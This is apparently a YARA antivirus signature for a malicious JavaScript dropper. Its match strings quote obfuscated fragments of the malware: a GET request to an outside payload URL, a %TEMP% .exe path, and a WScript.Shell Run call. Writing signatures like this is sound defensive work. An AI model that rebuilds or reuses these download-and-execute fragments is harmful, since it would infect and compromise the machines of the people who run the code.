rule sig_20160328_b82b2b17ea038847abebbfe855c7685f {
  meta:
    description = "datamaliciousorder - file 20160328_b82b2b17ea038847abebbfe855c7685f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "48d4ec69884a03ea9abac8007d534d5615da6577db12d658850c31a2d499a92b"

  strings:
    $s1  = "function Opgtqcwjha() {return Ohazygfs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"0im9io7Zt.exe\";};" fullword ascii
    $s2  = "Ajemhklwwd[Iawrrz](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Mdnaoak](Whmmtfluo() * 11)} while (Ajemhklwwd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Saoyygevza(Gunszlw, Qcfhf){return Gunszlw - Qcfhf;};" fullword ascii
    $s5  = "var Ohazygfs = function Xgnttln() {return WScript[Fglrzxnos](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Awafdbyaec(Hgowt){Ohazygfs[\"Run\"](Hgowt, Bawlvn, Bawlvn);};" fullword ascii
    $s7  = "var Lauthsgn = new this[\"Date\"]();" fullword ascii
    $s8  = "function Dodvmraoq() {return ((Swmvp == true) && (Swmvp == Jyohgms)) ? 1 : Bawlvn;};" fullword ascii
    $s9  = " while (Mbxbbr){" fullword ascii
    $s10 = "return Saoyygevza(Qlxxfxh, Wpxgocmo);" fullword ascii
    $s11 = "var Jwmiyuah = false;" fullword ascii
    $s12 = "function Qurxzlg(){return Qgbodf;};" fullword ascii
    $s13 = "function Whmmtfluo(){return 22;};" fullword ascii
    $s14 = "Jyohgms = true; " fullword ascii
    $s15 = "function Xqkdwr()" fullword ascii
    $s16 = "Swmvp = true; " fullword ascii
    $s17 = "function Pxcgha(){return Fglrzxnos;};" fullword ascii
    $s18 = "var Swmvp = false;" fullword ascii
    $s19 = "var Jyohgms = false;" fullword ascii
    $s20 = "function Nqvienvca(Ralvliepa) {var Carcuwtfac = (1, 2, 3, 4, 5, Ralvliepa); return Carcuwtfac;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}